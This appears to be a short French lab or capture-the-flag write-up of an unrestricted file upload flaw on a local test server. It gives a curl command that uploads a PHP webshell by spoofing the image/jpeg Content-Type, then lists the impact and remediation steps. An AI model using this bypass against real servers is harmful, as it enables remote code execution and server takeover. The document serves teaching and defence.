Unrestricted File Upload
=========================

URL vulnérable : http://192.168.56.101/index.php?page=upload

Le serveur vérifie uniquement le Content-Type (MIME type) du fichier
uploadé, sans vérifier l'extension réelle ni le contenu du fichier.

Exploitation :
  curl -s -X POST "http://192.168.56.101/index.php?page=upload" \
       -F "Upload=Upload" \
       -F "uploaded=@shell.php;type=image/jpeg"

  Un fichier .php est accepté si le MIME type est "image/jpeg".
  Le serveur fait confiance au Content-Type envoyé par le client,
  qui est entièrement contrôlable.

Impact :
  - Upload de webshell PHP exécutable sur le serveur
  - Exécution de code arbitraire (RCE)
  - Compromission totale du serveur

Correction :
  - Vérifier l'extension du fichier côté serveur
  - Vérifier les magic bytes du fichier (signature binaire réelle)
  - Ne pas se fier au Content-Type envoyé par le client
  - Stocker les uploads hors de la racine web
  - Renommer les fichiers uploadés aléatoirement

OWASP : A03 - Injection / Unrestricted File Upload